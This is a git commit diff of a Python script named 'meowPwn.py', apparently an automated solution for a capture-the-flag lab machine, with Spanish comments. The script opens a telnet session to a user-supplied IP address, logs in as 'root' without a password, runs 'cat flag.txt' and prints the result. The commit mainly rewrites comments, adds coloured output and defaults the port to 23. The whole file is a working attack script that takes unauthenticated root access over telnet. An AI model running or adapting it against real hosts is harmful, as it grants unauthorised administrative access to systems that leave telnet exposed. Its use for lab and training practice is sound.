715e1d076e806ceb6e56fdeb78bc0f0c341f5b97
4xL <77083140+4xLoff@users.noreply.github.com>
2023-06-20 15:30:36 -0500

    Update meowPwn.py

--- meowPwn.py
+++ meowPwn.py
@@ -1,42 +1,68 @@
 #!/usr/bin/python3
-import pexpect  # Importamos la biblioteca pexpect para interactuar con aplicaciones de línea de comandos.
-import argparse  # Importamos el módulo argparse para analizar argumentos de línea de comandos.
+
+import pexpect
+import argparse
+from colorama import Fore, Style
 
 class Exploit:
     def __init__(self, ip_address, lport):
-        self.ip_address = ip_address  # Guardamos la dirección IP proporcionada como atributo de la instancia.
-        self.lport = lport  # Guardamos el puerto proporcionado como atributo de la instancia.
+        self.ip_address = ip_address
+        self.lport = lport
 
     def run(self, username):
         try:
-            # Creamos un proceso de telnet y establecemos la conexión con la dirección IP y el puerto especificados.
+            # Iniciar el shell telnet
             shell = pexpect.spawn('telnet', [self.ip_address, str(self.lport)])
-            shell.expect(b'Escape character is')  # Esperamos a que aparezca el mensaje "Escape character is" en la salida del telnet.
-            shell.sendline(username.encode('ascii'))  # Enviamos el nombre de usuario al telnet.
+            shell.expect(b'Escape character is')
 
-            shell.expect(b'# ')  # Esperamos a que aparezca el símbolo de prompt "#" en la salida del telnet.
-            shell.sendline(b'cat flag.txt')  # Enviamos el comando "cat flag.txt" al telnet.
-            shell.expect(b'# ')  # Esperamos a que aparezca nuevamente el símbolo de prompt "#" en la salida del telnet.
-            output = shell.before.decode('utf-8')  # Capturamos la salida antes del prompt y la decodificamos de bytes a cadena de caracteres.
-            print(output)  # Imprimimos la salida en la consola.
+            # Enviar el nombre de usuario al shell telnet
+            shell.sendline(username.encode('ascii'))
 
-            shell.close()  # Cerramos la conexión telnet.
+            # Esperar el prompt del shell telnet
+            shell.expect(b'# ')
+
+            # Enviar el comando 'cat flag.txt' al shell telnet
+            shell.sendline(b'cat flag.txt')
+
+            # Esperar tanto la cadena 'END_OF_OUTPUT\r\n' como el prompt '# ' en la salida del shell telnet
+            shell.expect([b'END_OF_OUTPUT\r\n', b'# '], timeout=5)
+
+            # Obtener la salida antes del prompt '# ' o 'END_OF_OUTPUT\r\n'
+            output = shell.before.decode('utf-8').strip()
+
+            # Obtener la línea de la flag (segunda línea desde el final)
+            flag_output = output.split('\r\n')[-2]
+
+            # Imprimir la línea de la flag en color verde
+            print(Fore.GREEN + f"El contenido de la 'flag': {flag_output}" + Style.RESET_ALL)
+
+            # Cerrar el shell telnet
+            shell.close()
         except Exception as e:
-            print(f"Error al conectar por Telnet: {str(e)}")  # Si se produce una excepción, mostramos un mensaje de error.
+            # Manejar cualquier excepción ocurrida durante la ejecución
+            print(Fore.RED + f"Error al conectar por Telnet: {str(e)}" + Style.RESET_ALL)
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description='Uso de AutoPwn')  # Creamos un objeto ArgumentParser con una descripción.
-    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')  # Definimos un argumento para la dirección IP.
-    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto.')  # Definimos un argumento para el puerto.
-    return parser.parse_args()  # Analizamos los argumentos de línea de comandos y los devolvemos.
+    # Configurar y obtener los argumentos de línea de comandos
+    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
+    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
+    parser.add_argument('-p', '--port', dest='lport', default=23, required=False, help='Proporcionar puerto.')
+    return parser.parse_args()
 
 def main():
-    args = get_arguments()  # Obtenemos los argumentos de línea de comandos.
+    # Obtener los argumentos de línea de comandos
+    args = get_arguments()
 
-    # Creamos una instancia de la clase Exploit con la dirección IP y el puerto proporcionados.
+    # Crear una instancia del objeto Exploit con la IP y el puerto proporcionados
     exploit = Exploit(args.ip_address, args.lport)
-    username = "root"  # Definimos el nombre de usuario como "root".
-    exploit.run(username)  # Ejecutamos la explotación pasando el nombre de usuario.
+
+    # Definir el nombre de usuario
+    username = "root"
+
+    # Ejecutar el exploit
+    exploit.run(username)
 
 if __name__ == '__main__':
     main()
+
+
